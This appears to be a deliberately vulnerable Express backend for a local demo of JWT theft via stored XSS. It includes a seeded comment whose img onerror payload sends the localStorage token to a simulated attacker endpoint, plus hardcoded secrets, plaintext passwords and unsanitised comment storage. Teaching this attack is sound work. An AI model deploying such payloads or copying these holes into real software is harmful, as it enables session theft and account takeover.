const express = require("express");
const jwt = require("jsonwebtoken");
const cors = require("cors");

const app = express();
const JWT_SECRET = "super-secret-dev-key-do-not-use-in-prod";

app.use(cors({ origin: "http://localhost:5173" }));
app.use(express.json());

// --- In-memory stores ---
const users = [
  { id: 1, username: "alice", password: "password123", role: "user" },
  { id: 2, username: "admin", password: "admin123", role: "admin" },
];

// Comments store — one is pre-seeded with a stored XSS payload
const comments = [
  { id: 1, author: "bob", text: "Great article!", safe: true },
  {
    id: 2,
    author: "attacker",
    // This is a stored XSS payload: when rendered as HTML it steals the JWT
    text: `Nice post! <img src="x" onerror="
      const token = localStorage.getItem('jwt_token');
      fetch('http://localhost:3001/api/attacker/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token, source: 'stored-xss', page: location.href })
      });
    " />`,
    safe: false,
  },
];

const capturedTokens = [];

// --- Auth routes ---
app.post("/api/auth/login", (req, res) => {
  const { username, password } = req.body;
  const user = users.find((u) => u.username === username && u.password === password);
  if (!user) return res.status(401).json({ error: "Invalid credentials" });

  const token = jwt.sign(
    { sub: user.id, username: user.username, role: user.role },
    JWT_SECRET,
    { expiresIn: "1h" }
  );

  // VULNERABLE: client is expected to store this in localStorage
  res.json({ token, user: { id: user.id, username: user.username, role: user.role } });
});

// --- Middleware ---
function requireAuth(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth?.startsWith("Bearer ")) return res.status(401).json({ error: "No token" });
  try {
    req.user = jwt.verify(auth.slice(7), JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: "Invalid or expired token" });
  }
}

// --- Protected route ---
app.get("/api/profile", requireAuth, (req, res) => {
  res.json({
    message: `Welcome, ${req.user.username}!`,
    user: req.user,
    secret: "Your account balance is $9,999.00",
  });
});

// --- Comments (stored XSS vector) ---
app.get("/api/comments", (req, res) => res.json(comments));

app.post("/api/comments", requireAuth, (req, res) => {
  const { text } = req.body;
  if (!text?.trim()) return res.status(400).json({ error: "Empty comment" });
  const comment = { id: comments.length + 1, author: req.user.username, text, safe: true };
  comments.push(comment);
  res.json(comment);
});

// --- Simulated attacker endpoint ---
// In a real attack this would be on an external domain; here it's local for visibility
app.post("/api/attacker/capture", (req, res) => {
  const entry = { ...req.body, capturedAt: new Date().toISOString(), ip: req.ip };
  capturedTokens.push(entry);
  console.log("\n🚨 [ATTACKER] Token captured:", entry);
  res.status(200).json({ ok: true });
});

app.get("/api/attacker/log", (req, res) => res.json(capturedTokens));

app.listen(3001, () => console.log("Backend running on http://localhost:3001"));
